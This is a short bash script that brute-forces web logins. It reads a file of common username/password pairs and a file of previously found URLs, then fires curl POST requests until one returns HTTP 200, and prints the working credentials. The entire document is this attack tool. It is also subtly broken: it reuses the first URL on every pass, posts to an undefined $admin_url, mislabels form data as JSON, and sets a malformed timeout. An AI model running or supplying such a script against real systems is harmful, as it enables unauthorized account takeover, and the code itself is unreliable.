# $1 is the file containing most common credentials. $2 contains the previously found valid URLs
trycredentials() {
  credentials_file="$1"
  urls_file="$2"

  readarray -t existingURLs < "$urls_file"
  readarray -t credentials < "$credentials_file"

  # For each of the found URLs try the credentials
  for ((u=0; u<${#existingURLs[@]}; u++)); do
    echo "Now trying for URL : ${existingURLs[0]}"

    for ((i=0; i<${#credentials[@]}; i++)); do
      creds=(${credentials[i]//,/ }) # Split using the comma separator
      echo "-> Now trying with credentials: ${creds[0]}, ${creds[1]}"

      username="${creds[0]}" # for legibility
      password="${creds[1]}"
      
      # Try to login with these credentials
      response=$(curl -s -X POST -o /dev/null -d "username=$username&password=$password" -H "Content-Type: application/json" -w "%{http_code}" --max-time 0,1  "$admin_url" )
      if [ "$response" -eq 200 ]; then
        echo "Credentials found! Username: $username, password: $password"
        exit 0
      fi
    done
  done
}

trycredentials $1 $2
